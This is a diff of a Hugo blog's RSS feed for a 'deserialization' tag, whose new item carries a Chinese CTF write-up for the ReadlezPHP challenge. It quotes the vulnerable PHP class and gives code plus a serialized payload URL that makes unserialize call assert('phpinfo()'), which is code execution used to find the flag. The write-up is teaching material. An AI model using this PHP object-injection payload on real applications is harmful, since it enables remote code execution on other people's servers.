@@ -1,14 +1,19 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
-    <channel>
-        <title>反序列化 - 标签 - Braindance</title>
-        <link>http://localhost:1313/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
-        <description>反序列化 - 标签 - Braindance</description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Tue, 20 Apr 2021 17:12:43 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="self" type="application/rss+xml" /><item>
-    <title>ReadlezPHP&amp;EasySearch</title>
-    <link>http://localhost:1313/posts/ctf/readlezphpeasysearch/</link>
-    <pubDate>Tue, 20 Apr 2021 17:12:43 &#43;0800</pubDate><author>
-        <name>Braindance</name>
-    </author><guid>http://localhost:1313/posts/ctf/readlezphpeasysearch/</guid>
-    <description><![CDATA[ReadlezPHP源码找到time.php?source php]]></description>
-</item></channel>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>反序列化 on </title>
+    <link>/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+    <description>Recent content in 反序列化 on </description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 20 Apr 2021 17:12:43 +0000</lastBuildDate>
+    <atom:link href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ReadlezPHP&amp;EasySearch</title>
+      <link>/posts/ctf/readlezphpeasysearch/</link>
+      <pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate>
+      <guid>/posts/ctf/readlezphpeasysearch/</guid>
+      <description>ReadlezPHP 源码找到time.php?source&#xA;&amp;lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-&amp;gt;a = &amp;#34;Y-m-d h:i:s&amp;#34;; $this-&amp;gt;b = &amp;#34;date&amp;#34;; } public function __destruct(){ $a = $this-&amp;gt;a; $b = $this-&amp;gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET[&amp;#39;source&amp;#39;])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[&amp;#34;data&amp;#34;]); 分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。&#xA;所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)：&#xA;&amp;lt;?php&#xD;class HelloPhp&#xD;{&#xD;public $a=&amp;#39;phpinfo()&amp;#39;;&#xD;public $b=&amp;#39;assert&amp;#39;;&#xD;}&#xD;$s=new HelloPhp();&#xD;echo serialize($s); POST请求&#xA;time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;} 页面查找flag，在environment中找到flag</description>
+    </item>
+  </channel>
 </rss>
